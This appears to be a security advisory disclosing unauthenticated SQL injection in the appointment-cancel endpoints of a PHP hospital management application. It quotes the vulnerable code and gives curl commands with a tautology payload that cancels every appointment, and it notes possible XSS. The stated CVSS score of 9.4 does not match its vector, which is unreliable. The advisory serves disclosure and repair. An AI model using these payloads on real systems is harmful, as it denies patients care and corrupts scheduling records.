### Title

SQL injection in appointment cancellation endpoints `admin-panel.php?cancel` and `doctor-panel.php?cancel`

### Summary

Both `admin-panel.php` and `doctor-panel.php` accept a `$_GET['ID']` parameter that is concatenated into `UPDATE appointmenttb ... WHERE ID='...'` without parameter binding. The endpoints are reachable without authentication, so an unauthenticated attacker can submit a payload like `ID=' OR '1'='1` and flip the `userStatus`/`doctorStatus` of every appointment in the table at once.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

SQL Injection (CWE-89)

### Affected Code

File: `admin-panel.php`

```php
if(isset($_GET['cancel']))
  {
    $query=mysqli_query($con,"update appointmenttb set userStatus='0' where ID = '".$_GET['ID']."'");
    if($query)
    {
      echo "<script>alert('Your appointment successfully cancelled');</script>";
    }
  }
```

File: `doctor-panel.php`

```php
if(isset($_GET['cancel']))
  {
    $query=mysqli_query($con,"update appointmenttb set doctorStatus='0' where ID = '".$_GET['ID']."'");
    if($query)
    {
      echo "<script>alert('Your appointment successfully cancelled');</script>";
    }
  }
```

### Root Cause

The cancel logic uses string concatenation. `$_GET['ID']` is placed inside single quotes and the query is executed with `mysqli_query()`, which does not bind parameters. The endpoints also lack any session or role check, so any remote client can trigger them.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Capture the current state of `appointmenttb`:

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT ID,userStatus,doctorStatus FROM appointmenttb;"
```

```text
ID  userStatus  doctorStatus
1   1           0
2   0           1
...
```

3. Trigger the SQL injection through `admin-panel.php` and cancel every appointment by submitting a tautology:

```bash
curl -sS "$BASE_URL/admin-panel.php?ID=1'+OR+'1'%3d'1&cancel=update" \
  | grep -E "alert|Cancelled"
```

Observed response:

```text
<script>alert('Your appointment successfully cancelled');</script>
```

4. Verify that every appointment is now `userStatus=0`:

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT ID,userStatus FROM appointmenttb;"
```

```text
ID  userStatus
1   0
2   0
...
```

5. The same primitive on `doctor-panel.php` flips `doctorStatus` for every row:

```bash
curl -sS "$BASE_URL/doctor-panel.php?ID=1'+OR+'1'%3d'1&cancel=update" \
  | grep -E "alert|Cancelled"
```

```text
<script>alert('Your appointment successfully cancelled');</script>
```

6. Because the same `$_GET['ID']` is reflected in HTML form attributes on `admin-panel.php` (e.g. `<a href="admin-panel.php?ID=...&cancel=update"`), the injection primitive can also be used to inject markup/XSS payloads when admin renders the table.

### Impact

An unauthenticated attacker can mass-cancel every appointment in the system, denying service to all patients. The same injection point also allows tampering with `userStatus` and `doctorStatus` for arbitrary rows, including the ability to silently mark a patient as cancelled (`userStatus=0`) or a doctor as cancelled (`doctorStatus=0`) without their knowledge. In permissive MySQL configurations, the stacked statement can be used for arbitrary read/write of the database.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
Score: 9.4 (Critical)
```
